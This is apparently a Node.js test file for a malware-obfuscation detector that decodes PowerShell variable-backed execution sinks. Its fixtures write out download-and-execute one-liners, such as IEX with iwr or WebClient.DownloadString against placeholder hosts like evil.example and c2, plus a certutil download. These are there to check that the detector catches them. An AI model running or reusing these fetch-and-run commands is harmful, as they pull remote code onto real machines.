'use strict';
// ════════════════════════════════════════════════════════════════════════════
// cmd-obfuscation-phase2-var-sinks.test.js — Phase B variable-backed sinks.
//
// Every literal-argument PowerShell sink in cmd-obfuscation.js has a
// companion $-argument form in real-world malware:
//
//   powershell.exe -enc $b64
//   [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))
//   [scriptblock]::Create($sb).Invoke()
//   & $x   /   iex $x   /   Invoke-Expression $x   /   . $x
//   Invoke-Command -ScriptBlock $sb
//
// Phase B adds recognisers that consult the ps-mini symbol table built by
// `_buildPsSymbolTable(text)` to resolve those arguments. This file pins
// the happy-path decode plus the FP-gate behaviour for each sink.
// ════════════════════════════════════════════════════════════════════════════

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) { return host(cands.filter(pred)); }

function toB64Utf16LE(text) {
  const bytes = Buffer.alloc(text.length * 2);
  for (let i = 0; i < text.length; i++) {
    const cc = text.charCodeAt(i);
    bytes[i * 2]     = cc & 0xff;
    bytes[i * 2 + 1] = (cc >> 8) & 0xff;
  }
  return bytes.toString('base64');
}
function toB64Utf8(text) { return Buffer.from(text, 'utf8').toString('base64'); }

// ── 1. -EncodedCommand with $var argument ─────────────────────────────────

test('phase-B: `powershell -enc $b64` resolves through symbol table', () => {
  const inner = 'Invoke-Expression (iwr http://evil.example/p.ps1)';
  const b64 = toB64Utf16LE(inner);
  const text = `$b = '${b64}'; powershell.exe -enc $b`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /EncodedCommand \(var\)/.test(c.technique));
  assert.ok(hits.length >= 1, `expected var-enc hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('phase-B: `-EncodedCommand ${b64}` braced-var form', () => {
  const inner = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/s")';
  const b64 = toB64Utf16LE(inner);
  const text = `$\{b64\} = '${b64}'; powershell.exe -EncodedCommand \${b64}`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /EncodedCommand \(var\)/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /DownloadString/);
});

test('phase-B: `-enc $unset` must not fire (unresolved var)', () => {
  const text = 'powershell.exe -enc $unset';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /EncodedCommand \(var\)/.test(c.technique));
  assert.equal(hits.length, 0);
});

// ── 2. [Convert]::FromBase64String($x) + GetString ────────────────────────

test('phase-B: FromBase64String($x) + UTF8.GetString resolves $x', () => {
  const inner = 'Invoke-Expression $cmd; whoami /all';
  const b64 = toB64Utf8(inner);
  const text = `$x = '${b64}'; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /FromBase64String.*UTF8.*\(var\)/.test(c.technique));
  assert.ok(hits.length >= 1, `expected var-b64 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('phase-B: FromBase64String($x) + Unicode.GetString resolves $x', () => {
  const inner = 'certutil -urlcache -f http://e/p p.exe';
  const b64 = toB64Utf16LE(inner);
  const text = `$x = "${b64}"; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x))`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /FromBase64String.*UNICODE.*\(var\)/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /certutil/);
});

// ── 3. [scriptblock]::Create($var) ────────────────────────────────────────

test('phase-B: [scriptblock]::Create($sb) resolves body from $var', () => {
  const body = 'Invoke-Expression (iwr "http://c2/a.ps1").Content';
  const text = `$sb = '${body}'; [scriptblock]::Create($sb).Invoke()`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /scriptblock.*\(var\)/.test(c.technique));
  assert.ok(hits.length >= 1, `expected sb-var hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('phase-B: [ScriptBlock]::Create($sb) PascalCase + .Invoke() omitted', () => {
  const body = 'IEX (New-Object Net.WebClient).DownloadString("http://x")';
  const text = `$sb = "${body}"; [ScriptBlock]::Create($sb)`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /scriptblock.*\(var\)/.test(c.technique));
  assert.ok(hits.length >= 1);
});

test('phase-B: ScriptBlock.Create($sb) benign body is suppressed', () => {
  // `$sb = 'Write-Host "hi"'` — no exec-intent keyword → must NOT fire.
  const text = `$sb = 'Write-Host "hi"'; [scriptblock]::Create($sb).Invoke()`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /scriptblock.*\(var\)/.test(c.technique));
  assert.equal(hits.length, 0);
});

// ── 4. Paren-less invocation (& $x / iex $x / Invoke-Expression $x) ──────

test('phase-B: `& $cmd` resolves through symbol table', () => {
  const text = "$cmd = 'Invoke-Expression'; & $cmd 'whoami'";
  const cands = d._findPsVariableResolutionCandidates(text, {});
  const hits = pick(cands, c => /call-operator/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('phase-B: `iex $x` — suspicious target fires', () => {
  const text = "$x = 'Invoke-Expression'; iex $x arg";
  const cands = d._findPsVariableResolutionCandidates(text, {});
  const hits = pick(cands, c => /call-operator/.test(c.technique));
  assert.ok(hits.length >= 1);
});

test('phase-B: `& $benign` non-exec-intent target is suppressed', () => {
  const text = "$build = 'MyBuildTool'; & $build -Verbose";
  const cands = d._findPsVariableResolutionCandidates(text, {});
  const hits = pick(cands, c => /call-operator/.test(c.technique));
  assert.equal(hits.length, 0);
});

test('phase-B: `Invoke-Command -ScriptBlock $sb` resolves', () => {
  const text = "$sb = 'Invoke-Expression (iwr http://e/p)'; Invoke-Command -ScriptBlock $sb";
  const cands = d._findPsVariableResolutionCandidates(text, {});
  const hits = pick(cands, c => /call-operator/.test(c.technique));
  assert.ok(hits.length >= 1, `expected Invoke-Command hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test('phase-B: `. $x` dot-sourcing form resolves', () => {
  const text = "$x = 'Invoke-Expression'; . $x 'arg'";
  const cands = d._findPsVariableResolutionCandidates(text, {});
  const hits = pick(cands, c => /call-operator/.test(c.technique));
  assert.ok(hits.length >= 1);
});

// ── 5. _patternIocs mirrors present on every Phase B candidate ───────────

test('phase-B: every var-sink carries a _patternIocs mirror', () => {
  const inner = 'Invoke-Expression iex';
  const b64 = toB64Utf16LE(inner);
  const cases = [
    `$b = '${b64}'; powershell -enc $b`,
    `$sb = 'IEX (iwr http://x)'; [scriptblock]::Create($sb).Invoke()`,
  ];
  for (const text of cases) {
    const cands = d._findCommandObfuscationCandidates(text, {});
    const hits = cands.filter(c => /\(var\)/.test(c.technique));
    for (const h of hits) {
      assert.ok(Array.isArray(h._patternIocs) && h._patternIocs.length >= 1,
        `missing _patternIocs: ${h.technique}`);
      assert.equal(h._patternIocs[0].severity, 'high');
    }
  }
});

// ── 6. Amp-budget invariant on every Phase B candidate ───────────────────

test('phase-B: Phase B candidates respect the 32x amp-budget contract', () => {
  const inner = 'Invoke-Expression (iwr http://evil.example/payload.ps1)';
  const b64 = toB64Utf16LE(inner);
  const text = `$b = '${b64}'; powershell.exe -enc $b`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  for (const c of cands) {
    if (typeof c.deobfuscated === 'string' && typeof c.raw === 'string') {
      assert.ok(
        c.deobfuscated.length <= 32 * Math.max(1, c.raw.length),
        `amp violation: raw=${c.raw.length} deobf=${c.deobfuscated.length} technique=${c.technique}`,
      );
    }
  }
});
